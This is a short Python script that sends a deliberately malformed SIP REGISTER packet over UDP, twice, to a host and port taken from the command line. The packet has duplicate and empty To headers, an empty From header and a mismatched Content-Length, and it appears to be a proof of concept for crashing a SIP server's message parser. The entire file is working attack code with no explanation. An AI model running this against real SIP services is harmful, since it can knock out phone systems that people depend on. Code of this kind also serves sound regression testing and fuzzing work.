#!/usr/bin/env python
import socket
import sys

for _ in range(2):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.connect((sys.argv[1], int(sys.argv[2])))

    msg = "REGISTER sip:127.0.0.1:0 SIP/2.0\n" \
        "Via: SIP/2.0/UDP 172.17.13.240:5061;branch=9hG4bKydcnjlpe\n" \
        "To: <@127.0.0.1>;tag=\n" \
        "From: \n" \
        "To: <sip:>\n" \
        "Content-Length: 1\n" \
        "\n" \
        "\r\n"
    sock.sendall(msg)
